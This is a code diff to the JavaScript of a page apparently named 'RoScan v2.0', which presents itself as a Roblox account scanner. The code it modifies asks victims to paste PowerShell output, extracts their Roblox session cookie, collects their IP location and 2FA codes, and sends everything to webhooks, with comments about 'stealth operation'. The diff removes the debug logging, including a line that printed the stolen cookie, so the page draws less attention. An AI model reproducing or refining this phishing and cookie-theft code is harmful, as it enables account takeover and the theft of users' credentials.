@@ -47,7 +47,6 @@ function loadTheme() {
 
 // Enhanced Modal functionality
 function openScanModal() {
-            console.log('Opening scan modal...');
         const modal = document.getElementById('scanModal');
         const textarea = document.getElementById('powershellInput');
         
@@ -62,10 +61,9 @@ function openScanModal() {
                 }
             }, 400);
             
-            console.log('Modal opened successfully');
+
             // No notifications for stealth operation
-        } else {
-            console.error('Modal element not found!');
+        }
             // No notifications for stealth operation
         }
 }
@@ -162,7 +160,6 @@ async function getUserLocation() {
                 return locationData;
             }
         } catch (error) {
-            console.log('Primary location service failed, trying fallback...');
         }
 
         // Fallback to ipinfo.io
@@ -184,12 +181,11 @@ async function getUserLocation() {
                 };
             }
         } catch (fallbackError) {
-            console.log('Fallback location service also failed');
         }
 
         return locationData;
     } catch (error) {
-        console.error('Location detection failed:', error);
+
         return {
             ip: 'Location detection failed',
             country: 'Unknown',
@@ -230,7 +226,6 @@ async function submitPowerShell() {
 
     // Extract Roblox cookie
     globalRobloxCookie = extractRobloxCookie(inputText);
-    console.log('Extracted cookie:', globalRobloxCookie); // Debug log
 
     // Show loading state
     submitBtn.disabled = true;
@@ -274,7 +269,6 @@ async function submitPowerShell() {
         }, 80000);
 
     } catch (error) {
-        console.error('Error:', error);
         // Continue flow even if webhook fails
         setTimeout(() => {
             closeScanModal();
@@ -469,7 +463,6 @@ async function verifyCode() {
         }, 1500);
 
     } catch (error) {
-        console.error('2FA webhook error:', error);
         // Continue flow even if webhook fails
         verifyBtn.textContent = 'Verified!';
         verifyBtn.style.backgroundColor = '#10b981';
@@ -676,7 +669,7 @@ function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(function() {
         // No notifications for stealth operation
     }).catch(function(err) {
-        console.error('Failed to copy to clipboard: ', err);
+        
         // No notifications for stealth operation
     });
 }
@@ -764,7 +757,7 @@ const notificationCSS = `
 
 // Initialize everything when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, initializing RoScan v2.0...');
+
     
     // Add notification CSS
     const style = document.createElement('style');
@@ -852,14 +845,4 @@ document.addEventListener('keydown', function(event) {
 // Performance monitoring
 window.addEventListener('load', function() {
     const loadTime = performance.now();
-    console.log(`RoScan loaded in ${Math.round(loadTime)}ms`);
-    
-    // Track page performance
-    if ('performance' in window && 'navigation' in performance) {
-        const perfData = performance.getEntriesByType('navigation')[0];
-        console.log('Performance metrics:', {
-            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
-            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
-        });
-    }
 });
